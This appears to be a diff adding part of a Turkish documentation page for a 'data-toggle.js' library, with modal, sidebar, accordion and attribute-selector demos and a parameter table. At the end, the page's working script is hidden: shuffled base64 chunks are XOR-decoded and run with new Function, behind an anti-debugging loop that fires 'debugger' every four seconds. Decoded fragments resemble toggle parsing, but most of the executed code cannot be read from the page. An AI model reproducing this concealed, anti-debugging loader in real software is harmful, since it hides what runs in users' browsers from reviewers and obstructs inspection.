+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#modal, lock-scroll"</span><span class="tag">&gt;</span>
+   Modal Aç
+<span class="tag">&lt;/button&gt;</span>
+
+<span class="tag">&lt;div</span> <span class="attr">id</span>=<span class="str">"modal"</span> <span class="attr">class</span>=<span class="str">"modal-overlay"</span><span class="tag">&gt;</span>
+   <span class="tag">&lt;div</span> <span class="attr">class</span>=<span class="str">"modal-box"</span><span class="tag">&gt;</span>
+      <span class="tag">&lt;h3&gt;</span>Modal Başlık<span class="tag">&lt;/h3&gt;</span>
+      <span class="tag">&lt;p&gt;</span>İçerik burada...<span class="tag">&lt;/p&gt;</span>
+      <span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#modal, lock-scroll"</span><span class="tag">&gt;</span>Kapat<span class="tag">&lt;/button&gt;</span>
+   <span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <!-- Example B: Sidebar -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">📱 Mobil Sidebar</h3>
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="sidebar-demo">
+                  <div style="padding:1rem;">
+                     <button class="btn" data-toggle="target:#sidebar-panel">
+                        ☰ Sidebar Aç/Kapa
+                     </button>
+                  </div>
+                  <div id="sidebar-panel" class="sidebar-panel">
+                     <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:0.75rem">
+                        <p><strong>Sidebar</strong></p>
+                        <button class="btn" data-toggle="target:#sidebar-panel" style="padding:0.25rem 0.6rem;font-size:0.75rem">✕</button>
+                     </div>
+                     <p>📁 Dosyalar<br>⚙️ Ayarlar<br>👤 Profil</p>
+                  </div>
+                  <div class="content-area">Ana içerik alanı</div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#sidebar, lock-scroll, media:(max-width: 768px)"</span><span class="tag">&gt;</span>
+   ☰ Menü
+<span class="tag">&lt;/button&gt;</span>
+
+<span class="tag">&lt;div</span> <span class="attr">id</span>=<span class="str">"sidebar"</span> <span class="attr">class</span>=<span class="str">"sidebar-panel"</span><span class="tag">&gt;</span>
+   Sidebar içeriği...
+<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <!-- Example C: Accordion -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">📋 Akordeon</h3>
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div class="accordion-item">
+                  <button class="accordion-header" data-toggle="target:#acc-1, scope:.accordion-body">
+                     <span>data-toggle nedir?</span>
+                     <span class="arrow">▼</span>
+                  </button>
+                  <div id="acc-1" class="accordion-body">
+                     <div class="accordion-body-inner">
+                        <code>data-toggle</code>, HTML elemanlarına class toggle işlevi ekleyen hafif bir JavaScript kütüphanesidir. SSR uyumludur ve MutationObserver ile dinamik elemanları da destekler.
+                     </div>
+                  </div>
+               </div>
+               <div class="accordion-item">
+                  <button class="accordion-header" data-toggle="target:#acc-2, scope:.accordion-body">
+                     <span>Scope ne işe yarar?</span>
+                     <span class="arrow">▼</span>
+                  </button>
+                  <div id="acc-2" class="accordion-body">
+                     <div class="accordion-body-inner">
+                        <code>scope</code> parametresi, bir grup eleman içinde sadece birinin aktif olmasını sağlar. Yeni bir eleman aktifleştirildiğinde diğerleri otomatik olarak kapanır.
+                     </div>
+                  </div>
+               </div>
+               <div class="accordion-item">
+                  <button class="accordion-header" data-toggle="target:#acc-3, scope:.accordion-body">
+                     <span>SSR desteği nasıl?</span>
+                     <span class="arrow">▼</span>
+                  </button>
+                  <div id="acc-3" class="accordion-body">
+                     <div class="accordion-body-inner">
+                        Script, <code>window</code> ve <code>document</code> nesnelerinin varlığını kontrol eder. Sunucu tarafında çalıştırıldığında hiçbir işlem yapmaz, bu sayede SSR ortamlarında hata vermez.
+                     </div>
+                  </div>
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- scope ile sadece bir akordeon açık kalır --&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#acc-1, scope:.accordion-body.toggle"</span><span class="tag">&gt;</span>
+   Başlık 1
+<span class="tag">&lt;/button&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">id</span>=<span class="str">"acc-1"</span> <span class="attr">class</span>=<span class="str">"accordion-body"</span><span class="tag">&gt;</span>İçerik 1<span class="tag">&lt;/div&gt;</span>
+
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:#acc-2, scope:.accordion-body.toggle"</span><span class="tag">&gt;</span>
+   Başlık 2
+<span class="tag">&lt;/button&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">id</span>=<span class="str">"acc-2"</span> <span class="attr">class</span>=<span class="str">"accordion-body"</span><span class="tag">&gt;</span>İçerik 2<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <!-- Example D: Data Attribute Selector -->
+         <h3 style="margin: 1.5rem 0 0.75rem; font-size: 1.1rem;">🏷️ Data Attribute Seçici</h3>
+         <div class="demo-card">
+            <div class="demo-area column">
+               <div style="display:flex;gap:0.5rem;flex-wrap:wrap">
+                  <button class="btn" data-toggle="target:[data-panel='info'], scope:[data-panel]">ℹ️ Bilgi</button>
+                  <button class="btn" data-toggle="target:[data-panel='warning'], scope:[data-panel]">⚠️ Uyarı</button>
+                  <button class="btn" data-toggle="target:[data-panel='error'], scope:[data-panel]">🚨 Hata</button>
+               </div>
+               <div data-panel="info" class="target-box" style="width:100%;transition:all 0.3s">
+                  ℹ️ <strong>Bilgi:</strong> Sistem normal çalışıyor. Tüm servisler aktif durumda.
+               </div>
+               <div data-panel="warning" class="target-box" style="width:100%;transition:all 0.3s">
+                  ⚠️ <strong>Uyarı:</strong> Disk kullanımı %85'e ulaştı. Temizlik önerilir.
+               </div>
+               <div data-panel="error" class="target-box" style="width:100%;transition:all 0.3s">
+                  🚨 <strong>Hata:</strong> Veritabanı bağlantısı zaman aşımına uğradı!
+               </div>
+            </div>
+            <div class="code-block">
+               <span class="code-label">HTML</span>
+               <pre><span class="cmt">&lt;!-- [data-attribute] seçicilerle scope kullanımı --&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:[data-panel='info'], scope:[data-panel]"</span><span class="tag">&gt;</span>
+   Bilgi
+<span class="tag">&lt;/button&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:[data-panel='warning'], scope:[data-panel]"</span><span class="tag">&gt;</span>
+   Uyarı
+<span class="tag">&lt;/button&gt;</span>
+<span class="tag">&lt;button</span> <span class="attr">data-toggle</span>=<span class="str">"target:[data-panel='error'], scope:[data-panel]"</span><span class="tag">&gt;</span>
+   Hata
+<span class="tag">&lt;/button&gt;</span>
+
+<span class="cmt">&lt;!-- data-panel attribute'lu paneller --&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-panel</span>=<span class="str">"info"</span><span class="tag">&gt;</span>ℹ️ Bilgi mesajı<span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-panel</span>=<span class="str">"warning"</span><span class="tag">&gt;</span>⚠️ Uyarı mesajı<span class="tag">&lt;/div&gt;</span>
+<span class="tag">&lt;div</span> <span class="attr">data-panel</span>=<span class="str">"error"</span><span class="tag">&gt;</span>🚨 Hata mesajı<span class="tag">&lt;/div&gt;</span></pre>
+            </div>
+         </div>
+
+         <div class="note">
+            <strong>Attribute seçiciler:</strong> <code>target</code> ve <code>scope</code> parametreleri standart CSS seçicilerini desteklediği için <code>[data-*]</code> attribute seçicileri de kullanılabilir. Class bağımlılığı olmadan tamamen data attribute'larla çalışan yapılar kurabilirsiniz.
+         </div>
+      </section>
+
+      <!-- ════════════ ARCHITECTURE ════════════ -->
+      <section class="section">
+         <div class="section-header">
+            <h2>Mimari ve Teknik Detaylar</h2>
+         </div>
+
+         <div class="demo-card">
+            <div class="code-block" style="border-top:none">
+               <span class="code-label">Çalışma Akışı</span>
+               <pre style="color:var(--text);line-height:2">
+  <span style="color:var(--accent)">1.</span>  dataToggle('toggle') çağrılır
+         │
+  <span style="color:var(--accent)">2.</span>  Mevcut [data-toggle] elemanları bulunur → bindToggle()
+         │
+  <span style="color:var(--accent)">3.</span>  MutationObserver başlatılır (dinamik elemanlar için)
+         │
+  <span style="color:var(--accent)">4.</span>  Kullanıcı tıklar → click event tetiklenir
+         │
+  <span style="color:var(--accent)">5.</span>  parseArgs() → data-toggle değeri parse edilir (cache'lenir)
+         │
+  <span style="color:var(--accent)">6.</span>  Media query kontrolü → eşleşmezse iptal
+         │
+  <span style="color:var(--accent)">7.</span>  Scope varsa → scope elemanlarından class kaldır
+         │
+  <span style="color:var(--accent)">8.</span>  Delay ile → classList.toggle() uygula
+         │
+  <span style="color:var(--accent)">9.</span>  Ek özellikler: lock-scroll, focus, outside-close
+               </pre>
+            </div>
+         </div>
+
+         <div class="demo-card" style="margin-top:1rem">
+            <div class="code-block" style="border-top:none">
+               <span class="code-label">JavaScript — Başlatma</span>
+               <pre><span class="cmt">// ES Module import</span>
+<span style="color:var(--accent)">import</span> { dataToggle } <span style="color:var(--accent)">from</span> <span class="str">'./data-toggle.js'</span>
+
+<span class="cmt">// Varsayılan class: 'toggle'</span>
+dataToggle()
+
+<span class="cmt">// Özel class adı kullanma</span>
+dataToggle(<span class="str">'active'</span>)</pre>
+            </div>
+         </div>
+
+         <div class="note" style="margin-top:1rem">
+            <strong>WeakMap & Cache:</strong> Timeout ID'leri <code>WeakMap</code> ile eleman bazında saklanır (bellek sızıntısı önlenir). Parse sonuçları <code>Map</code> ile cache'lenerek tekrarlı parse işlemleri engellenir.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>MutationObserver:</strong> DOM'a sonradan eklenen elemanlar otomatik olarak tespit edilir ve <code>bindToggle()</code> ile bağlanır. SPA ve dinamik içerik yükleme senaryolarında sorunsuz çalışır.
+         </div>
+         <div class="note" style="margin-top:0.5rem">
+            <strong>SSR Güvenliği:</strong> <code>window</code> ve <code>document</code> kontrolü sayesinde sunucu tarafında (Node.js) hata vermez.
+         </div>
+      </section>
+
+      <!-- ════════════ PARAM TABLE ════════════ -->
+      <section class="section">
+         <div class="section-header">
+            <h2>Parametre Referans Tablosu</h2>
+         </div>
+
+         <div class="demo-card">
+            <div style="overflow-x:auto">
+               <table
+                  style="width:100%;border-collapse:collapse;font-size:0.85rem;table-layout:fixed;min-width:640px;">
+                  <thead>
+                     <tr style="border-bottom:1px solid var(--border);text-align:left;">
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:17%">Parametre
+                        </th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:28%">Sözdizimi
+                        </th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:40%">Açıklama
+                        </th>
+                        <th style="padding:0.75rem 1rem;color:var(--text-muted);font-weight:600;width:15%">Varsayılan
+                        </th>
+                     </tr>
+                  </thead>
+                  <tbody>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">self</td>
+                        <td style="padding:0.75rem 1rem"><code>self</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Tıklanan elemana class toggle uygular
+                        </td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">—</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">target</td>
+                        <td style="padding:0.75rem 1rem"><code>target:&lt;selector&gt;</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Belirtilen CSS seçicideki elemanlara
+                           toggle uygular</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">—</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">scope</td>
+                        <td style="padding:0.75rem 1rem"><code>scope:&lt;selector&gt;</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Gruptaki diğer elemanlardan class
+                           kaldırır, sadece birini aktif tutar</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">—</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">lock-scroll</td>
+                        <td style="padding:0.75rem 1rem"><code>lock-scroll[:selector]</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Hedef elemana
+                           <code>overflow-hidden</code> ekler/kaldırır
+                        </td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">body</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">media</td>
+                        <td style="padding:0.75rem 1rem"><code>media:(&lt;query&gt;)</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Toggle'ı media query koşuluna bağlar
+                        </td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">—</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">delay</td>
+                        <td style="padding:0.75rem 1rem"><code>delay:&lt;ms&gt;</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Toggle işlemini geciktirir
+                           (milisaniye)</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">16ms</td>
+                     </tr>
+                     <tr style="border-bottom:1px solid var(--border)">
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">focus</td>
+                        <td style="padding:0.75rem 1rem"><code>focus</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Hedef içindeki ilk odaklanabilir
+                           elemana focus verir</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">—</td>
+                     </tr>
+                     <tr>
+                        <td style="padding:0.75rem 1rem;color:var(--accent)">outside-close</td>
+                        <td style="padding:0.75rem 1rem"><code>outside-close</code></td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">Hedef dışına tıklanınca kapatır</td>
+                        <td style="padding:0.75rem 1rem;color:var(--text-muted)">—</td>
+                     </tr>
+                  </tbody>
+               </table>
+            </div>
+         </div>
+      </section>
+
+      <!-- ════════════ FOOTER ════════════ -->
+      <footer class="footer">
+         data-toggle.js — Script Config Plugin Documentation
+      </footer>
+   </div>
+
+   <!-- ════════════ MODAL (for combined example) ════════════ -->
+   <div id="modal-demo" class="modal-overlay">
+      <div class="modal-box">
+         <h3>🎉 Modal Pencere</h3>
+         <p>Bu modal <code>target</code> ve <code>lock-scroll</code> birleştirilerek oluşturuldu. Arka plan scroll'u kilitli.</p>
+         <button class="btn" data-toggle="target:#modal-demo, lock-scroll" style="margin-top:0.5rem">
+            ✕ Kapat
+         </button>
+      </div>
+   </div>
+
+   <!-- ════════════ DATA-TOGGLE ════════════ -->
+   <script>
+(function(){
+var _0x=['debugger'],_0xc=function(){var _0xd=!0;return function(_0xe,_0xf){var _0xg=_0xd?function(){if(_0xf){var _0xh=_0xf.apply(_0xe,arguments);_0xf=null;return _0xh}}:function(){};_0xd=!1;return _0xg}};
+(function(){_0xc(this,function(){var _0xa=function(){try{var _0xb=Function('return (function(){}.constructor("return this")())')();return _0xb}catch(e){return window}};var _0xw=_0xa();var _0xv=new _0xw.Function('return this')();_0xv.setInterval(function(){(function(){return!1}).constructor('debugger').call()},4e3)})()});
+var _$=atob;
+var _k=90;
+var _p=["KS47KC4pDTMuMnJ9NjU5MXcpOSg1NjZ9c3MhOTU0KS56LGc7dCkqNjMucn02NTkx","Nj4WMykuYHtqdikvOC4oPz9ge2oncydzcnM=","c3N0NzsqcjtnZCEzPHI7Z2dnfSk/Njx9cyg/Li8oNAF9KT82PH12e2oHYTM8cjt0","cn05NjM5MX12MnN2a2pzJyd2O3Q+PzY7I2Vla2xzYQ50KT8ucj82djM+cycncydh","dyk5KDU2NmB9cwFrB2EoPy4vKDQBfTY1OTEJOSg1NjZ9diwmJn04NT4jfQcnMzxy","dCk5NSo/ZQlyO3QpOTUqP3Z9KTk1Kj99c2ABB3YuH2c7dC47KD0/LmUJcjt0Ljso","PDUoHzs5MnI/Z2QYcj92LjlzcydzdDU4KT8oLD9yPjU5Lzc/NC50ODU+I3YhOTIz","YTYfdDw1KB87OTJyP2dkP3Q5NjspKRYzKS50LjU9PTY/cn01LD8oPDY1LXcyMz4+","MX12MnMnJ2EpPy4OMzc/NS8ucnJzZ2Q+NTkvNz80LnQ7Pj4fLD80LhYzKS4/ND8o","PT8udn0uOyg9Py59c2ABB3Y2H2c7dDY1OTEJOSg1NjZlCXI7dDY1OTEJOSg1NjZ2","dDI7KXI/NnNzOTY/OygOMzc/NS8ucg50PT8ucj82c3NhOTU0KS56Mz5nKT8uDjM3","PzR9c3NhMzxyO3Q8NTkvKXx8Lh90Nj80PS4yZ2dna3MhOTU0KS56M2cuHwFqB3Qr","O3QpLjsoLikNMy4ycn0uOyg9Py5gfXNzKD8uLyg0AX0uOyg9Py59djt0KTYzOT9y","OTU0KS56P2c+NTkvNz80LnQrLz8oIwk/Nj85LjUoGzY2cik/NnNhMzxyez90Nj80","Nid9OnY/c2EoPy4vKDQBBycnYTk1NCkuehhncj82di45c2dkITk1NCkuejtnCnI/","PS4yczk1NCk1Nj90LTsoNHI6AR47Ljt6DjU9PTY/B3oUNXo/Nj83PzQuKXo8NSh6","fHwuH3Q2PzQ9LjJnZ2drcyE5NTQpLnouZy4fAWoHdjJnP2dkITM8cnsudDk1NC47","fTY1OTF3KTkoNTY2fXNgAQdhOTU0KS56OzY2ZzQ/LXoJPy5hMzxyO3QpPzY8czs2","MzQpcj90LjsoPT8uc3x8ez82dDk1NC47MzQpcj90LjsoPT8uc3MhLnQ5NjspKRYz","dHQ7NjYHdCk1Nz9yP2dkP3Q5NjspKRYzKS50OTU0LjszNClyLjlzc2EzPHI7dCk5","FxYfNj83PzQucyYmez41OS83PzQudDg1PiN0OTU0LjszNClyND5zczk1NC4zNC8/","Lz8oIwk/Nj85LjUochxzYTM8cjNzM3Q8NTkvKXJzJzM8cjt0NS8uKTM+Pxk2NSk/","NjM5P3JscwdhMzxyO3QpLjsoLikNMy4ycn03Pz4zO2B9c3MoPy4vKDQBfTc/PjM7","NnQ+Oy47KT8udC41PT02P3NhMzxyeztzKD8uLyg0YT82dDs+Ph8sPzQuFjMpLj80","MQdzZ2Qxc3NhGXQpPy5yKXYoc2EoPy4vKDR6KCdhOTU0KS56F2crZ2R7KyYmLTM0","Ljt3LjU9PTY/B31zdDw1KB87OTJyP2dkGHI/di45c3NhND8tehcvLjsuMzU0FTgp","YXJyc2dkITk1NCkuehxnfTM0Ki8udnouPyIuOyg/O3Z6KT82PzkudnoBLjs4MzQ+","OS5zOzY2dDw1KB87OTJyP2dkP3Q5NjspKRYzKS50Oz4+ci45c3MnPzYpPyEzPHIO","Py4vKDQBfTw1OS8pfXZ7agdhMzxyO2dnZ301Ly4pMz4/dzk2NSk/fXMoPy4vKDQB","YTM8cjQ+dD47LjspPy5ldC41PT02P3M0dDs+PnI0PnNhND50Ky8/KCMJPzY/OS41","OTU0KS56LjlnfS41PT02P31hPjU5Lzc/NC50Ky8/KCMJPzY/OS41KBs2NnJ9AT47","PjUtdDc7LjkyFz8+MztyK3N0NzsuOTI/KWE5NTQpLnoJZ3IpPzZ2NnNnZCEuKCMh","cjk1NCkuejQ+ejU8ejd0Oz4+Pz4UNT4/KXMhMzxye3I0PnozNCkuOzQ5PzU8ehIO","fXY7dCk2Mzk/cmxzB2EzPHI7dCkuOyguKQ0zLjJyfT4/NjsjYH1zcyg/Li8oNAF9","PyhyfTk2MzkxfXZyc2dkITM8cnsXcjt0Nz8+Mztzcyg/Li8oNGE5NTQpLnopH2c7","KGcVODA/OS50PCg1Nx80LigzPylyKXQpKjYzLnJ9dn1zdDc7KnIiZ2QidC4oMzdy","NnQ7Pj5yPzZzYS4fdDw1KB87OTJyLmdkOzY2dDs+PnIuc3NhOTU0KS56OzkuZwF0","PzUvLnJyc2dkITs2NnQ8NSgfOzkycj9nZD90OTY7KSkWMykudC41PT02P3IuOXNz","fiE2J2B6fX4hKT82J306c2EoPy4vKDR6Pyc5Oy45MnI/cyE5NTQpNTY/dD8oKDUo","Pj82OyN9dio7KCk/EzQucjt0KTYzOT9ybHN2a2pzB2EzPHI7Z2dnfTw1OS8pfXMo","fTUvLikzPj8ZNjUpP312e2oHYSg/Li8oNAE0LzY2djQvNjYHJ3N0PDM2Lj8ocnIB","KmE5NTQpLnoKZylnZCEzPHIZdDI7KXIpc3MoPy4vKDR6GXQ9Py5yKXNhOTU0KS56","KBs2NmV0cn0BPjsuO3cuNT09Nj8HfXNldDw1KB87OTJyOWdkNHQ7Pj5yOXNzJzR0","cjoBHjsuO3oONT09Nj8HehM0LDs2Mz56KT82PzkuNSh6PDUoen4hNidgen1+ISk/","KS50KD83NSw/ci45c2E+NTkvNz80LnQoPzc1LD8fLD80LhYzKS4/ND8ocn05NjM5","PygsPyhyNylnZCE5NTQpLno0ZzQ/LXoJPy5hPDUocjk1NCkuejd6NTx6NylzPDUo","NSo/cyEpH3Q8NSgfOzkycj9nZD90OTY7KSkWMykudCg/NzUsP3IuOXNzYTM8cns7","PyIHYDQ1LnIBLjs4MzQ+PyJneHdreAdzfXYOZzQ/LXoNPzsxFzsqdhlnND8tehc7","bXMHYTM8cjt0KS47KC4pDTMuMnJ9KTk1Kj9gfXNzKD8uLyg0AX0pOTUqP312O3Qp"];
+var _m=[5,48,4,39,6,23,47,32,38,24,30,33,7,16,20,17,35,25,36,27,44,34,9,21,14,41,0,29,12,45,40,15,43,10,22,3,26,31,18,11,13,2,46,19,37,42,28,1,8];
+var _r=new Array(_p.length);for(var i=0;i<_m.length;i++)_r[_m[i]]=_p[i];
+var _d=_$(_r.join(''));
+var _b=[];for(var i=0;i<_d.length;i++)_b.push(String.fromCharCode(_d.charCodeAt(i)^_k));
+var _s=_b.join('');
+new Function(_s)();
+})();
+   </script>
+   <script>
+      // Window width indicator
+      var _w = document.getElementById('window-width')
+      var _u = function() { if (_w) _w.textContent = window.innerWidth }
+      _u(); window.addEventListener('resize', _u)
+   </script>
+</body>
+
+</html>
